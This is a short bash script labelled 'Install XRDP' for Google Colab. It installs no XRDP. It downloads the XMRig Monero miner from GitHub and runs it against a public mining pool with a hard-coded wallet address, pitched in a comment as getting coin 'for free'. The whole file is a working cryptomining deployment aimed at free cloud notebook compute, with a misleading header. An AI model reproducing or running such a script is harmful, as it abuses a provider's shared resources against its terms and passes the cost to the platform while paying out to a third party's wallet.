#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig --donate-level 5 -o pool.supportxmr.com:443 -u 42xGE9er6jLZSPbypMiDqnSuAwadughHsF7C2YQRquZMNyrP8h9dCwJ87g465vZ28RDeSRYD1XPJRRqibrHtGXhwHuaqoNm -k --tls -p Worker01
